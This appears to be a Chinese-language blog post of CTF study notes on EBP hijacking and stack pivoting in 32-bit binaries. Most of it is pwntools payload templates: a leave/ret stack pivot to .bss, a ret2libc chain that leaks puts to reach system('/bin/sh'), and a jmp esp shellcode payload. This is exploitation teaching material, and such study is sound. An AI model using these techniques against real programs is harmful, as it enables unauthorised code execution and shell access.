---
layout: post
title:  "ebp劫持"
date:   2020-02-23 
categories: jekyll update
---
### ebp 劫持

#### 一、修改main_ebp -> （实质）间接修改main_return_address

main_ebp -> target_addr 

```python
main -> func(a,b)




b
a
func_return_main
				<= func_ebp = main_ebp (to fake)
				
				
				
				<= fun_esp
				
main_return_address -> target_func
main_ebp -> target_address
				
				
```

```python
paylaod = padding + p32(target_func) + p32(target_addr)
```

**即修改main_ebp ,在 main 函数返回时，leave ;	ret ;**

**leave 后 esp = ebp ，再pop ebp;那么 esp -> 返回地址。即在之前布置ebp的高4字节处改为system -> getshell**

#### 栈劫持

对于wiki上的 ret2libc 的题可以利用栈劫持(pop_ebp + leave_ret)去做(即只利用了一次栈溢出) //没有

```python
payload   = padding + (esp_padding?)  + fake_ebp

payload += p32(elf.plt["puts"]) + p32(pop_ret) + p32(elf.got["puts"])

payload += p32(elf.plt["gets"]) + p32(pop_ret) + p32(bss_addr)

payload += p32(pop_ebp_ret) + p32(bss_addr) + p32(leave_ret)
#ebp -> bss  ; mov esp,ebp  ; pop ebp  ;  ret ->system

p.sendlineafter("Can you find it!?",payload)
puts_addr = u32(p.recv(4))
libc_base = puts_addr - libc.symbols["puts"]
libc.address = libc_base
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()

payload = "junk" + p32(system) + "junk" + p32(binsh)
p.sendline(payload)
p.interactive()
```



#### 三、 若有，可以利用 jmp  esp;

```
jmp_esp_addr = 0x8048504
shellcode = " " # 短的sc
padding = ''
payload = ''
payload +=shellcode.ljust(padding + fake_ebp ,"\x90")
payload += asm("sub esp,40;jmp esp")
hyq.sendlineafter(" ",payload)
hyq.interactive()
```

即劫持eip = esp ; 利用往栈上写指令，写shellcode 并执行 -> getshell.



参考链接：https://www.bilibili.com/video/BV1JV411m7PC?p=3